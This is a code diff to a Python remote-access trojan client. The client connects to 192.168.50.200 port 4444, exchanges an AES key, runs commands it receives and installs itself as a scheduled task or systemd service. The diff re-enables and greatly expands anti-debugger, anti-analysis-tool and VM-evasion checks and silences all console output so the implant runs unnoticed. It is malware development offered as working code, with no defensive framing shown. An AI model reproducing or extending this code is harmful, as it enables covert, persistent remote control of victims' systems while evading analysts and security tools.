@@ -2,7 +2,6 @@ import os
 import sys
 import time
 import socket
-# import ctypes
 import subprocess
 from Crypto.Cipher import AES
 from Crypto.Random import get_random_bytes
@@ -118,26 +117,32 @@ def check_vm():
     except:
         return False
 
-# def check_debugger():
+def check_debugger():
     try:
         os_name = platform.system()
         debug_count = 0
         
         if os_name == "Windows":
-            if ctypes.windll.kernel32.IsDebuggerPresent() != 0:
-                debug_count += 2
-            
             debugger_processes = [
                 "x64dbg.exe", "x32dbg.exe", "ollydbg.exe", "ida.exe", "ida64.exe",
-                "windbg.exe", "immunitydebugger.exe", "radare2.exe", "ghidra.exe"
+                "windbg.exe", "immunitydebugger.exe", "radare2.exe", "ghidra.exe",
+                "processhacker.exe", "procexp.exe", "procexp64.exe", "procmon.exe",
+                "wireshark.exe", "fiddler.exe", "charles.exe", "tcpview.exe",
+                "filemon.exe", "regmon.exe", "cain.exe", "netstat.exe", "tcpview.exe",
+                "autoruns.exe", "autorunsc.exe", "filemon.exe", "procmon.exe",
+                "regmon.exe", "cain.exe", "netstat.exe", "tcpview.exe", "wireshark.exe",
+                "fiddler.exe", "httpdebugger.exe", "httpdebuggerpro.exe", "fiddler.exe",
+                "charles.exe", "wireshark.exe", "fiddler.exe", "httpdebugger.exe",
+                "httpdebuggerpro.exe", "fiddler.exe", "charles.exe", "wireshark.exe"
             ]
+            
             for proc in debugger_processes:
-                if subprocess.run(f"tasklist | findstr {proc}", shell=True).returncode == 0:
+                if subprocess.run(f"tasklist | findstr {proc}", shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL).returncode == 0:
                     debug_count += 1
             
             try:
-                netstat = subprocess.check_output("netstat -an", shell=True).decode().lower()
-                debug_ports = ["23946", "23947", "23948", "23949"]
+                netstat = subprocess.check_output("netstat -an", shell=True, stderr=subprocess.DEVNULL).decode().lower()
+                debug_ports = ["23946", "23947", "23948", "23949", "23950", "23951", "23952", "23953", "23954", "23955"]
                 for port in debug_ports:
                     if port in netstat:
                         debug_count += 1
@@ -147,35 +152,50 @@ def check_vm():
             try:
                 reg_keys = [
                     r"HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\AeDebug",
-                    r"HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options"
+                    r"HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options",
+                    r"HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System",
+                    r"HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\Audit",
+                    r"HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\Audit\ProcessCreationIncludeCmdLine_Enabled"
                 ]
                 for key in reg_keys:
-                    result = subprocess.run(f'reg query "{key}"', shell=True, capture_output=True)
+                    result = subprocess.run(f'reg query "{key}"', shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
                     if result.returncode == 0:
                         debug_count += 1
             except:
                 pass
-                
-        else:  # Linux
+
+            debug_tools = [
+                "windbg", "x64dbg", "x32dbg", "ollydbg", "ida", "ida64",
+                "radare2", "ghidra", "immunitydebugger", "processhacker",
+                "procexp", "procmon", "wireshark", "fiddler", "charles"
+            ]
+            for tool in debug_tools:
+                if subprocess.run(f"where {tool}", shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL).returncode == 0:
+                    debug_count += 1
+            
+            debug_vars = ["_NT_SYMBOL_PATH", "_NT_ALT_SYMBOL_PATH", "DBGHELP", "DBGHELP_DOWNLOAD_URL"]
+            for var in debug_vars:
+                if var in os.environ:
+                    debug_count += 1
+                    
+        else:
             debugger_processes = [
-                "gdb", "lldb", "radare2", "ida", "ghidra", "strace", "ltrace"
+                "gdb", "lldb", "radare2", "ida", "ghidra", "strace", "ltrace",
+                "valgrind", "perf", "systemtap", "dtrace", "ftrace", "ebpf",
+                "wireshark", "tcpdump", "fiddler", "charles", "mitmproxy"
             ]
             for proc in debugger_processes:
-                if subprocess.run(f"ps aux | grep {proc}", shell=True).returncode == 0:
+                if subprocess.run(f"ps aux | grep {proc}", shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL).returncode == 0:
+                    debug_count += 1
+            
+            debug_vars = ["LD_PRELOAD", "LD_LIBRARY_PATH", "LD_DEBUG", "LD_TRACE_LOADED_OBJECTS"]
+            for var in debug_vars:
+                if var in os.environ:
                     debug_count += 1
             
             try:
-                env_vars = os.environ
-                debug_vars = ["LD_PRELOAD", "LD_LIBRARY_PATH", "LD_DEBUG"]
-                for var in debug_vars:
-                    if var in env_vars:
-                        debug_count += 1
-            except:
-                pass
-            
-            try:
-                netstat = subprocess.check_output("netstat -tuln", shell=True).decode().lower()
-                debug_ports = ["23946", "23947", "23948", "23949"]
+                netstat = subprocess.check_output("netstat -tuln", shell=True, stderr=subprocess.DEVNULL).decode().lower()
+                debug_ports = ["23946", "23947", "23948", "23949", "23950", "23951", "23952", "23953", "23954", "23955"]
                 for port in debug_ports:
                     if port in netstat:
                         debug_count += 1
@@ -186,7 +206,10 @@ def check_vm():
                 debug_files = [
                     "/proc/self/status",
                     "/proc/self/fd/0",
-                    "/proc/self/cmdline"
+                    "/proc/self/cmdline",
+                    "/proc/self/environ",
+                    "/proc/self/maps",
+                    "/proc/self/mem"
                 ]
                 for file in debug_files:
                     if os.path.exists(file):
@@ -200,8 +223,15 @@ def check_vm():
                                 debug_count += 1
             except:
                 pass
+            
+            try:
+                capabilities = subprocess.check_output("cat /proc/self/status | grep Cap", shell=True, stderr=subprocess.DEVNULL).decode().lower()
+                if "cap_sys_ptrace" in capabilities:
+                    debug_count += 1
+            except:
+                pass
         
-        return debug_count >= 3
+        return debug_count >= 5
                 
     except:
         return False
@@ -226,7 +256,7 @@ class TaskInstaller:
             result = subprocess.run(cmd, shell=True, capture_output=True, text=True)
             return result.returncode == 0
         except Exception as e:
-            print(f"Error installing Windows task: {e}")
+            # print(f"Error installing Windows task: {e}")
             return False
 
     def uninstall_windows_task(self):
@@ -235,7 +265,7 @@ class TaskInstaller:
             result = subprocess.run(cmd, shell=True, capture_output=True, text=True)
             return result.returncode == 0
         except Exception as e:
-            print(f"Error uninstalling Windows task: {e}")
+            # print(f"Error uninstalling Windows task: {e}")
             return False
 
     def install_linux_service(self):
@@ -262,7 +292,7 @@ class TaskInstaller:
             subprocess.run(f"systemctl start {self.task_name}", shell=True)
             return True
         except Exception as e:
-            print(f"Error installing Linux service: {e}")
+            # print(f"Error installing Linux service: {e}")
             return False
 
     def uninstall_linux_service(self):
@@ -274,7 +304,7 @@ class TaskInstaller:
             subprocess.run("systemctl daemon-reload", shell=True)
             return True
         except Exception as e:
-            print(f"Error uninstalling Linux service: {e}")
+            # print(f"Error uninstalling Linux service: {e}")
             return False
 
     def install_task(self):
@@ -417,7 +447,7 @@ class ClientHandler:
         while True:
             try:
                 cmd = decrypt(self.recv()).decode()
-                print(f"[Received] {cmd}")
+                # print(f"[Received] {cmd}")
                 if cmd == "close":
                     self.connection.close()
                     sys.exit()
@@ -648,14 +678,14 @@ class ClientHandler:
 # ------------------ Main Server ------------------
 
 def Connect_to_server():
-    if not check_vm():
-        print(" No Debugger or VM detected.")
+    if not (check_vm() or check_debugger()):
+        # print(" No Debugger or VM detected.")
         with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
             operating_system = predict_operating_system()
             while 1:
                 try:
                     sock.connect(("192.168.50.200",4444))
-                    print("[*] Connected to server ...    ")
+                    # print("[*] Connected to server ...    ")
                     time.sleep(1)
                     sock.sendall(key)  # Send 256-bit key
                     time.sleep(1)
@@ -666,17 +696,17 @@ def Connect_to_server():
                     if client.authenticate():
                         client.handle_commands(operating_system)
                     else:
-                        print("Authentication Error")
-                    client.connection.close()
+                        # print("Authentication Error")
+                        client.connection.close()
                     return
                 except Exception:
                     timer = 20
-                    print("Server is not up yet. Trying again in")
+                    # print("Server is not up yet. Trying again in")
                     for i in range(timer,0,-1):
-                        print(f"{i} seconds ", end="\r",flush=True)
+                        # print(f"{i} seconds ", end="\r",flush=True)
                         time.sleep(1)
     else:
-        print("Debugger or VM detected. Exiting...")
+        # print("Debugger or VM detected. Exiting...")
         sys.exit()
 
 if __name__ == "__main__":
